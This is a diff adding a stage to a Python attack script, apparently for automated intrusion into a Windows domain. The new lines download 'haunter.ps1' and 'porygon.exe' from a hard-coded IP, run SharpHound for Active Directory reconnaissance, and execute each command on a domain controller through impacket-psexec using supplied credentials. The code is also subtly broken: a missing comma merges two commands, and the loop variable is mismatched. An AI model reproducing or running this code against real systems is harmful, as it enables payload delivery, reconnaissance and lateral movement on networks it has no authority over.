@@ -245,6 +245,19 @@ def phaseFive():
 			subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
 		except Exception as e:
 			pass
+	
+	psCommands = [
+	"iwr -uri http://94.249.192.5:8000/haunter.ps1 -out C:\Users\Administrator\Music\haunter.ps1",
+	"C:\Users\Administrator\Music\SharpHound.ps1 -c All"
+	"iwr -uri http://94.249.192.5:8000/porygon.exe -out C:\Users\Administrator\Pictures\porygon.exe",
+	]
+	for commands in psCommands:
+		try:
+			print(f"Running {command}. Sleeping for 30 seconds.")
+			# Add impacket-psexec command here.
+			subprocess.run(f"impacket-psexec {username}:{password}@{DC1} powershell.exe -c "+command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
+		except Exception as e:
+			pass
 
 def main():
 	# Ensure Sudo Usage
